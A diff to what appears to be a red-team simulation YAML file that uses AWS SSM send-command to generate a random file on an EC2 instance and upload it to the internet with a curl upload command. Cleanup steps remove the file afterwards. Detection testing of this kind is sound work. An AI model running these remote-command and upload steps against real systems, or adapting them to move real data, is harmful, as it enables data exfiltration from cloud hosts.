@@ -11,8 +11,9 @@ description: |
   The output is stored in file `/tmp/exfil_url.txt`
 
 args:
-  - name: aws_region
-    description: The AWS region the EC2 instance is in.
+  - name: region
+    description: The AWS region to use.
+    default: us-east-1
   - name: ec2_instance_id
     description: The instance ID of the EC2 to exfiltrate the test file from.
   - name: generated_exfil_file_path
@@ -59,23 +60,23 @@ steps:
   - name: generate_exfil_file_over_ssm
     description: Generate a file for exfiltration on the ec2 instance to be exfiltrated.
     inline: |
-      aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
+      aws ssm send-command --region {{.Args.region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
       --parameters commands=["sudo su ubuntu && \
       openssl rand -out {{.Args.generated_exfil_file_path}} {{.Args.exfil_file_size_bytes}}"] > /dev/null
     cleanup:
       inline: |
-        aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
+        aws ssm send-command --region {{.Args.region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
         --parameters commands=["sudo su ubuntu && \
         rm {{.Args.generated_exfil_file_path}}"] > /dev/null
 
   - name: upload_exfil_file
     description: Upload the generated exfil file to the internet. The URL of uploaded file can be found in `tmp/exfil_url.txt`
     inline: |
-      aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
+      aws ssm send-command --region {{.Args.region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
       --parameters commands=["sudo su ubuntu && \
       {{.Args.curl_upload_command}} {{.Args.generated_exfil_file_path}} -o /tmp/exfil_url.txt && cat /tmp/exfil_url.txt"] > /dev/null
     cleanup:
       inline: |
-        aws ssm send-command --region {{.Args.aws_region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
+        aws ssm send-command --region {{.Args.region}} --instance-ids {{.Args.ec2_instance_id}} --document-name "AWS-RunShellScript" \
         --parameters commands=["sudo su ubuntu && \
         rm /tmp/exfil_url.txt"] > /dev/null
